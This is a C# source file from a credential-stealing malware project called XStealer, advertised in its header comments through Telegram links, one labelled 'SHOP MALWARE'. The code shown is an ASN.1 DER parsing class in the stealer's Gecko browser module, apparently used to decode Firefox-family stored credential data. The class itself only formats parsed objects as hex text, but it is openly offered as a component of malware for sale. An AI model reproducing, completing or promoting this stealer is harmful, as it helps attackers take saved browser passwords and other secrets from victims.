// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Browsers.Gecko
{
    using System.Collections.Generic;
    using System.Text;
    using Helpers;

    public class Asn1DerObject
    {
        public Enums.Type ObjectType { get; set; }
        public byte[] ObjectData { get; set; }
        public int ObjectLength { get; set; }
        public List<Asn1DerObject> Objects { get; set; }
        public Asn1DerObject() => Objects = new List<Asn1DerObject>();

        public override string ToString()
        {
            StringBuilder sb = new StringBuilder(), sbt = new StringBuilder();
            try
            {
                switch (ObjectType)
                {
                    case Enums.Type.Sequence: sb.AppendLine("SEQUENCE {"); break;

                    case Enums.Type.Integer:
                        {
                            byte[] objectData = ObjectData;
                            foreach (byte b2 in objectData)
                            {
                                sbt.AppendFormat("{0:X2}", b2);
                            }
                            sb.Append("\tINTEGER ").Append(sbt).AppendLine(); break;
                        }
                    case Enums.Type.OctetString:
                        {
                            byte[] objectData = ObjectData;
                            foreach (byte b3 in objectData)
                            {
                                sbt.AppendFormat("{0:X2}", b3);
                            }
                            sb.Append("\tOCTETSTRING ").AppendLine(sbt?.ToString()); break;
                        }
                    case Enums.Type.ObjectIdentifier:
                        {
                            byte[] objectData = ObjectData;
                            foreach (byte b in objectData)
                            {
                                sbt.AppendFormat("{0:X2}", b);
                            }
                            sb.Append("\tOBJECTIDENTIFIER ").AppendLine(sbt?.ToString()); break;
                        }
                }
                foreach (Asn1DerObject @object in Objects)
                {
                    sb.Append(@object?.ToString());
                }
                if (ObjectType == Enums.Type.Sequence)
                {
                    sb.AppendLine("}");
                }
                sbt.Remove(0, sbt.Length - 1);
            }
            catch { }
            return sb?.ToString();
        }
    }
}